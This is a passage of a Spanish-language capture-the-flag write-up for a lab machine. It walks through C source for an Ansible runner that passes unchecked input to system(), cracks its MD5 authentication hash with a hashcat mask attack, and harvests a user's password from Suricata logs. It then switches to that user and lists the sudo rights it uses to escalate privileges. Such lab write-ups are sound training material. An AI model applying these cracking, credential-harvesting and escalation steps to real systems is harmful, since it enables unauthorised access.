</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MD5</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)auth_key, <span style="color:#a6e22e">strlen</span>(auth_key), digest);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> md5_str[<span style="color:#ae81ff">33</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sprintf</span>(<span style="color:#f92672">&amp;</span>md5_str[i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;%02x&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)digest[i]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(md5_str, AUTH_KEY_HASH) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">listPlaybooks</span>() {
</span></span><span style="display:flex;"><span>    DIR <span style="color:#f92672">*</span>dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>(PLAYBOOK_LOCATION);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (dir <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Failed to open the playbook directory&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>entry;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> playbookNumber <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ((entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>(dir)) <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>d_type <span style="color:#f92672">==</span> DT_REG <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strstr</span>(entry<span style="color:#f92672">-&gt;</span>d_name, <span style="color:#e6db74">&#34;.yml&#34;</span>) <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, playbookNumber, entry<span style="color:#f92672">-&gt;</span>d_name);
</span></span><span style="display:flex;"><span>            playbookNumber<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">closedir</span>(dir);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">runPlaybook</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>playbookName) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> run_command[<span style="color:#ae81ff">1024</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(run_command, <span style="color:#66d9ef">sizeof</span>(run_command), <span style="color:#e6db74">&#34;%s -i %s %s%s&#34;</span>, ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(run_command);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">installRole</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>roleURL) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> install_command[<span style="color:#ae81ff">1024</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(install_command, <span style="color:#66d9ef">sizeof</span>(install_command), <span style="color:#e6db74">&#34;%s install %s&#34;</span>, ANSIBLE_GALAXY_BIN, roleURL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(install_command);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Usage: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> auth_required <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> auth_key[<span style="color:#ae81ff">128</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>; i <span style="color:#f92672">&lt;</span> argc; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(argv[i], <span style="color:#e6db74">&#34;-a&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> argc) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">strncpy</span>(auth_key, argv[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#66d9ef">sizeof</span>(auth_key));
</span></span><span style="display:flex;"><span>                auth_required <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Error: -a option requires an auth key.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">check_auth</span>(auth_key)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Error: Authentication failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;list&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">listPlaybooks</span>();
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;run&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> playbookNumber <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (playbookNumber <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            DIR <span style="color:#f92672">*</span>dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>(PLAYBOOK_LOCATION);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (dir <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Failed to open the playbook directory&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>entry;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> currentPlaybookNumber <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>playbookName <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ((entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>(dir)) <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>d_type <span style="color:#f92672">==</span> DT_REG <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strstr</span>(entry<span style="color:#f92672">-&gt;</span>d_name, <span style="color:#e6db74">&#34;.yml&#34;</span>) <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (currentPlaybookNumber <span style="color:#f92672">==</span> playbookNumber) {
</span></span><span style="display:flex;"><span>                        playbookName <span style="color:#f92672">=</span> entry<span style="color:#f92672">-&gt;</span>d_name;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    currentPlaybookNumber<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">closedir</span>(dir);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (playbookName <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">runPlaybook</span>(playbookName);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Invalid playbook number.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Invalid playbook number.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;install&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">installRole</span>(argv[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Usage2: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Este programa en C permite gestionar playbooks de Ansible, listar archivos de playbooks, ejecutar playbooks específicos y instalar roles de Ansible Galaxy, todo ello tras una verificación de autenticación mediante una clave hash MD5. A continuación se explica detalladamente cada sección del programa:</p>
<ol>
<li>
<p><strong>Definiciones y Constantes:</strong></p>
<ul>
<li>Se definen las ubicaciones de archivos y comandos necesarios.</li>
<li><code>AUTH_KEY_HASH</code> almacena un hash MD5 para la autenticación.</li>
</ul>
</li>
<li>
<p><strong>Función <code>check_auth</code>:</strong></p>
<ul>
<li>Toma una clave de autenticación (<code>auth_key</code>) y calcula su hash MD5.</li>
<li>Compara el hash calculado con <code>AUTH_KEY_HASH</code>.</li>
<li>Devuelve 1 si coinciden, indicando autenticación exitosa, o 0 en caso contrario.</li>
</ul>
</li>
<li>
<p><strong>Función <code>listPlaybooks</code>:</strong></p>
<ul>
<li>Abre el directorio especificado en <code>PLAYBOOK_LOCATION</code>.</li>
<li>Lista todos los archivos que terminan en <code>.yml</code>, numerándolos.</li>
</ul>
</li>
<li>
<p><strong>Función <code>runPlaybook</code>:</strong></p>
<ul>
<li>Construye un comando para ejecutar un playbook específico usando <code>ansible-playbook</code>.</li>
<li>Usa el archivo de inventario especificado en <code>INVENTORY_FILE</code>.</li>
</ul>
</li>
<li>
<p><strong>Función <code>installRole</code>:</strong></p>
<ul>
<li>Construye un comando para instalar un rol de Ansible Galaxy usando <code>ansible-galaxy</code>.</li>
</ul>
</li>
<li>
<p><strong>Función <code>main</code>:</strong></p>
<ul>
<li>Procesa los argumentos de la línea de comandos.</li>
<li>Verifica que se ha proporcionado una clave de autenticación y la comprueba.</li>
<li>Según el primer argumento (<code>list</code>, <code>run</code>, <code>install</code>):
<ul>
<li>Llama a <code>listPlaybooks</code> para listar los playbooks.</li>
<li>Llama a <code>runPlaybook</code> para ejecutar un playbook específico, determinado por su número en la lista.</li>
<li>Llama a <code>installRole</code> para instalar un rol desde una URL.</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="crackeando-el-hash-de-runnerc">Crackeando el hash de runner.c</h2>
<p>El flujo principal del programa incluye una verificación de autenticación antes de permitir cualquier operación. Si la autenticación falla, el programa termina con un mensaje de error.</p>
<p>Este hash MD5 lo podemos crackear ya que sabemos que la contraseña empieza por &ldquo;UHI75GHI&rdquo; y sigue por 4 carácteres que probablemente sean mayúsculas y numéricos.</p>
<p>Con hashcat podemos hacer un ataque de fuerza bruta por máscara.</p>
<p>`hashcat -m 0 -a 3 -1 ?u?d hashes.txt UHI75GHI?1?1?1?1</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Session..........: hashcat
</span></span><span style="display:flex;"><span>Status...........: Cracked
</span></span><span style="display:flex;"><span>Hash.Mode........: 0 (MD5)
</span></span><span style="display:flex;"><span>Hash.Target......: 0feda17076d793c2ef2870d7427ad4ed
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Time</span>.Started.....: Mon Jul 29 19:01:29 2024 (0 secs)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Time</span>.Estimated...: Mon Jul 29 19:01:29 2024 (0 secs)
</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
</span></span><span style="display:flex;"><span>Guess.Mask.......: UHI75GHI?1?1?1?1 [12]
</span></span><span style="display:flex;"><span>Guess.Charset....: -1 ?u?d, -2 Undefined, -3 Undefined, -4 Undefined
</span></span></code></pre></div><p>Por ahora esta password no nos sirve de nada, pero nos servirá para terminar de escalar privilegios.</p>
<h2 id="information-leakage-via-privileged-logs">Information Leakage via privileged logs</h2>
<p>Pasando el <code>linpeas.sh</code> podemos ver algo extraño.
<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
<p>Vamos a revisar ese directorio.</p>
<p>Vemos un montón de logs y tenemos permiso de lectura.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev_acc@intuition:/var/log/suricata$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">40576</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root       <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">29</span> 15:08 .
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">12</span> root syslog     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">29</span> 15:08 ..
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">29</span> 15:08 eve.json
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">16703683</span> Jul <span style="color:#ae81ff">29</span> 15:08 eve.json.1
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">5760612</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> eve.json.1-2024040114.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr  <span style="color:#ae81ff">8</span> 14:19 eve.json.1-2024042213.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr <span style="color:#ae81ff">22</span> 13:26 eve.json.1-2024042918.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr <span style="color:#ae81ff">29</span> 18:27 eve.json.1-2024072915.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">214743</span> Oct <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2023</span> eve.json.5.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">5050595</span> Oct <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2023</span> eve.json.7.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">972578</span> Sep <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2023</span> eve.json.8.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">29</span> 15:08 fast.log
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">29</span> 15:08 fast.log.1
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> fast.log.1-2024040114.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr  <span style="color:#ae81ff">8</span> 14:19 fast.log.1-2024042213.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr <span style="color:#ae81ff">22</span> 13:26 fast.log.1-2024042918.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr <span style="color:#ae81ff">29</span> 18:27 fast.log.1-2024072915.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root         <span style="color:#ae81ff">20</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> fast.log.5.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">1033</span> Oct  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2023</span> fast.log.7.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">1485</span> Sep <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2023</span> fast.log.8.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">29</span> 15:08 stats.log
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">7741988</span> Jul <span style="color:#ae81ff">29</span> 15:08 stats.log.1
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">4293890</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> stats.log.1-2024040114.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr  <span style="color:#ae81ff">8</span> 14:19 stats.log.1-2024042213.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr <span style="color:#ae81ff">22</span> 13:26 stats.log.1-2024042918.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Apr <span style="color:#ae81ff">29</span> 18:27 stats.log.1-2024072915.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">73561</span> Oct <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2023</span> stats.log.5.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">376680</span> Oct <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2023</span> stats.log.7.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">67778</span> Sep <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2023</span> stats.log.8.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root          <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">29</span> 15:08 suricata.log
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">26867</span> Jul <span style="color:#ae81ff">29</span> 15:08 suricata.log.1
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">3893</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> suricata.log.1-2024040114.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">68355</span> Apr  <span style="color:#ae81ff">8</span> 14:19 suricata.log.1-2024042213.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">95100</span> Apr <span style="color:#ae81ff">22</span> 13:26 suricata.log.1-2024042918.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">26145</span> Apr <span style="color:#ae81ff">29</span> 18:27 suricata.log.1-2024072915.backup
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root        <span style="color:#ae81ff">990</span> Apr  <span style="color:#ae81ff">1</span> 14:50 suricata.log.5.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">1412</span> Oct <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2023</span> suricata.log.7.gz
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">5076</span> Oct  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2023</span> suricata.log.8.gz
</span></span></code></pre></div><p>Con zgrep podemos filtrar por palabras que nos interesen como <code>user</code> y <code>pass</code>
<code>zgrep -i -w pass ./*.gz | less</code></p>
<p>Y podemos detectar una supuesta credencial en el fichero <code>eve.json</code> -&gt; <code>Lopezzz1992%123</code>
<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
<p>También podemos ver que esa solicitud fue respondida con un <code>Authentication failed</code></p>
<p>Un poco mas abajo vemos la supuesta contraseña válida.
<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
<p>Existe un usuario <code>lopez</code> en el sistema, por lo cual podemos intentar pivotar a este usuario.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev_acc@intuition:/var/log/suricata$ cat /etc/passwd | grep bash
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>adam:x:1002:1002:,,,:/home/adam:/bin/bash
</span></span><span style="display:flex;"><span>dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
</span></span><span style="display:flex;"><span>lopez:x:1003:1003:,,,:/home/lopez:/bin/bash
</span></span></code></pre></div><p>¡Somos <code>lopez</code>!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev_acc@intuition:/var/log/suricata$ su lopez
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span>lopez@intuition:/var/log/suricata$
</span></span></code></pre></div><p>Podemos ejecutar como cualquier usuario el binario <code>runner2</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lopez@intuition:/var/log/suricata$ sudo -l
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> lopez: 
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> lopez on intuition:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
</span></span><span style="display:flex;"><span>    use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User lopez may run the following commands on intuition:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> /opt/runner2/runner2
</span></span></code></pre></div><h1 id="local-privilege-escalation">Local Privilege Escalation</h1>
<h2 id="ingeniería-inversa-al-binario-runner2">Ingeniería inversa al binario runner2</h2>
<p>Me pide un archivo <code>json</code></p>
